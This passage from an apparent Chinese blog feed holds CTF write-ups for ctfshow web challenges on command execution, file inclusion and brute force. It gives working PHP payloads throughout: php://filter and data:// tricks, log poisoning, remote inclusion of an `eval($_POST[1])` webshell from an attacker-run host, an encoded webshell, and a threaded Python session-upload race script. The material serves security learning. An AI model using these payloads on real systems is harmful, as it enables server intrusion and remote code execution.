过滤了一堆，但是注意过滤的括号是中文括号，因此除了字母空格还能用括号</li>
</ol>
<ul>
<li><p>localeconv()函数<br>获取数字格式信息。<br>返回包含本地化数字和货币格式信息的关联数组。<br>其中第一位返回小数点(.)，这个正是我们需要的<br><a href="https://www.php.net/manual/zh/function.localeconv.php">localeconv()函数的详细信息</a></p>
</li>
<li><p>pos()函数<br>current() 的别名<br>返回数组中的当前值</p>
</li>
<li><p>scandir()函数<br>列出指定路径中的文件和目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="keyword">string</span> <span class="variable">$directory</span>, <span class="keyword">int</span> <span class="variable">$sorting_order</span> = SCANDIR_SORT_ASCENDING, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>返回 array，包含有 directory 中的文件和目录。</p>
</li>
</ul>
<p>返回值<br>成功则返回包含有文件名的 array，如果失败则返回 false。如果 directory 不是个目录，则返回布尔值 false 并生成一条 E_WARNING 级的错误。</p>
<ul>
<li><p>array_reverse()函数<br>返回单元顺序相反的数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reverse</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">bool</span> <span class="variable">$preserve_keys</span> = <span class="literal">false</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<p>array_reverse() 接受数组 array 作为输入并返回一个单元为相反顺序的新数组。</p>
</li>
<li><p>next()函数<br>将数组中的内部指针向前移动一位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>next() 和 current() 的行为类似，只有一点区别，在返回值之前将内部指针向前移动一位。这意味着它返回的是下一个数组单元的值并将数组指针向前移动了一位。或当没有更多单元时返回 false。</p>
</li>
</ul>
<p>pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。<br>为了得到倒数第二个元素，将数组逆序再将指针调整到下一个。</p>
<ol start="2">
<li>构造payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></li>
</ol>
<p>或者可以使用另一种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">1=system(&#x27;tac f*&#x27;);</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-文件包含</title>
    <url>/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含不够熟练，需要增加熟练度。</p>
<span id="more"></span>
<h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过GET方式传入参数file，如果变量file不为空，则通过include函数进行文件包含。</p>
</li>
<li><p>构造payload<br>通过php伪协议构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过GET方式传入参数file，如果变量不为空，并且其中不含php，则通过include函数包含文件。</p>
</li>
<li><p>构造payload<br>由于不能包含php，所以不能使用php伪协议，改为用data伪协议绕过。<br>通过shell_code命令执行(``)读取flag.php的内容<br>或者用base64加密可以使用php<br>构造payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>目录地址<br>日志地址通常为<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">一般apache日志在类似目录下(/var/log/httpd/access.log)</span><br></pre></td></tr></table></figure>
根据官方的Hint，可以尝试访问：<br><code>http://url/?file=/var/log/nginx/access.log</code><br>通过burp抓包可以得到user-agent和Referer字段，由此我们可以尝试在User-agent或Referer处注入命令执行代码</li>
</ul>
<ol start="2">
<li>构造payload<br>首先注入能显示文件的代码<br><code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br>发现flag文件为fl0g.php后，执行显示的代码：<br><code>&lt;?php echo system(&#39;cat fl0g.php&#39;);?&gt;</code></li>
</ol>
<p>或者采用另一种方法：<br>远程文件包含<br>xxx为自己服务器地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p>
<h1 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h1><p>原理可以看看这篇文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a><br>Python脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2, data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这段代码使用了 Python 的 requests 库来对一个特定的 URL 进行攻击。它创建了两个线程，一个线程执行写操作，另一个线程执行读操作。</p>
<p>在写操作线程中，它会不断地以 <code>multipart/form-data</code> 的形式向 URL1 发送 POST 请求，其中包含一个文件和一个名为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的数据。这个文件的内容是<code>&lt;?php eval($_POST[1]);?&gt;</code> 。</p>
<p>在读操作线程中，它会不断地向 URL2 发送 POST 请求，其中包含一个名为 1 的数据，值为 <code>system(&quot;cat f*&quot;);</code> 。这个请求会使得在服务器上执行 cat f* 的命令。如果返回的结果中包含 ctfshow{ ，它会将返回的结果打印出来.</p>
<p>这段代码使用了多线程的技术，可以同时进行写和读操作，最终目的是构造出一个能够执行系统命令的 payload，在返回的结果中寻找flag。</p>
<p>这种攻击方式是由于服务器上存在文件上传漏洞而导致的，由于服务器没有对文件的内容进行限制，攻击者可以上传一个带有恶意代码的文件，使得服务器执行恶意代码，达到攻击目的。</p>
<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>php:&#x2F;&#x2F;filter的妙用与如何绕过die和exit<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></p>
</li>
<li><p>PHP支持的编码方式<br><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">支持的字符编码</a><br>还有多种编码可以绕过</p>
</li>
</ul>
<p>首先是要通过GET方式一个参数file，以及POST方式一个参数content。对参数file进行了几个过滤。<br>最后写入文件，因为有urldecode，所以需要将file进行二次编码。content参数之前跟了die，这是为了content里即使有php代码也无法执行，那么我们关键是要绕过这个die，这个在上面链接文章里有所提及。</p>
<p><code>$_POST[&#39;content&#39;]</code> 可以控制协议，即可使用 <code>php://filter</code> 流的 <code>base64-decode</code> 方法将 <code>$content</code> 解码，利用php的 base64_decode函数特性来去除die。因为base64编码只包含<a href="https://foofish.net/base64.html">64个可打印字符</a>，解码base64时，遇到不在其中的字符会跳过，仅将合法字符重新组成一个新的字符串进行解码。</p>
<p>于是， <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码最终剩下的只有 <code>phpdie</code> 。因为base64编码4个一组，所以我们再填上两个合法字符，这样便能正常解码，后面传入的content也就能正常解码了，最后我们发现 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码就不存在了。</p>
<p>当PHP没有开启short_open_tag时，我们还可以采用rot13编码绕过检测，原理同上面类似。</p>
<p>于是这道题一般来说有2类方法，用base64绕过或rot13绕过。</p>
<ul>
<li><p>base64绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2563%252e%2570%2568%2570</span><br><span class="line">// 这是经过了二次url编码的字符，原来的字符为：</span><br><span class="line">?file=php://filter/read=string.rot13/resource=c.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=11PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==</span><br><span class="line">// 这是经过了base64编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>rot13绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">与上面的GET相同</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br><span class="line">// 这是经过了rot13编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>成功后，访问c.php，并且POST传参 <code>1=system(&#39;tac f*&#39;);</code><br>即可成功拿到flag</p>
<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>咋一看，过滤了蛮多，但是不要紧，直接用data伪协议，把要执行的命令进行base64编码</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg</span><br></pre></td></tr></table></figure>
<p>注意如果base64编码中有“&#x3D;”要去掉，否则会造成error</p>
</li>
</ol>
<p>成功拿到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-爆破</title>
    <url>/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于爆破，我的能力还非常不足，虽说是最后手段，但尽量不要有短板比较好。</p>
<span id="more"></span>
<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>打开页面后，是一个需要输入用户名和密码的网页，随便填写了用户名admin,密码123后，开始抓包。<br>抓包后送到Repeater进行分析，发现有一个 <code>Authorization: Base YWRtaW46MTIz</code><br>将后半段明显加密的部分送到Decoder进行分析，发现是Base64加密，解密后的内容是: <code>admin:123</code><br>那么接下来就是到Intruder进行爆破</p>
<ul>
<li><p>Positions处<br>如果已经有符号了先Clear,再在密文两边Add</p>
</li>
<li><p>Payloads处<br>在Payload Options [Simple List]处Load从ctfshow的web21处下载的字典<br>在Payload Processing处点击Add,选择Add prefix,输入 <code>admin:</code> 。因为我们已经知道用户名和格式是这个了，这样可以提高效率。<br>再次点击Add，选择Encode，再选择Base64-encode,因为我们之前已经验证了是Base64加密。<br>把最后的URL-encode these characters的勾选取消，因为会导致编码错误。</p>
</li>
</ul>
<p>如果嫌默认线程10比较慢的话，可以在Resource Pool下自定义线程和延迟时间等等。</p>
<p>接下来就是Start Attack，稍等一下，然后找到响应为200或长度与其它不同的包，找响应，即可拿到flag。</p>
<h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><p>可以用这个网站在线爆破子域名:<a href="http://z.zcjun.com/">http://z.zcjun.com/</a><br>不过爆破不出，子域名的flag在vip.ctf.show里。<br>在标签上即可拿到flag</p>
<h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从题可以看出，我们需要通过GET方式传入一个名为token的参数，要求是token参数的md5值的第1位&#x3D;第14位&#x3D;第17位，并且取得该md5值的第1位，第14位，第17位的整数值相加再除以md5值的第1位&#x3D;该md5值的第31位。<br>如果以上条件均满足，则能取得flag。由于条件比较宽松，我们可以直接用burp爆破，线程调高一点，直接从1-10000爆破，可以发现，数字422和1202均满足条件。<br>或者写一个PHP脚本，如下所示：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s1</span> = <span class="string">&#x27;1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZqwertyuiopasdfghjklzxcvbnm&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">62</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span>&lt;<span class="number">62</span>; <span class="variable">$k</span>++)&#123;</span><br><span class="line">        <span class="variable">$t3</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">31</span>,<span class="number">1</span>))) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;token=&quot;</span>.<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样可以得到3j和ZE满足条件。<br>又或者写一个Python脚本，如下所示：<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (<span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> ((<span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">14</span>:<span class="number">15</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">17</span>:<span class="number">18</span>], <span class="number">16</span>)) / <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>)) == <span class="built_in">int</span>(m[<span class="number">31</span>:<span class="number">32</span>], <span class="number">16</span>):</span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
输出结果如上<br>因此可以轻松拿到flag</li>
</ol>
<h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用值372619038种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。</li>
</ol>
<p>然后它将$r变量的值与生成的随机数进行比较，如果它们相等，则打印标记。如果未设置”r”参数，则会突出显示脚本的源代码并将命令 <code>&#39;result &#39;cat /proc/version&#39;</code> 打印到屏幕上。</p>
<p>只要知道了种子372619038和使用的mt_rand，就可以知道生成的伪随机数为1155388967(不同PHP版本得出的值可能不同)，这是一个固定值。在开发中尽量不要设置种子。<br>因此轻松拿到flag</p>
<h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ 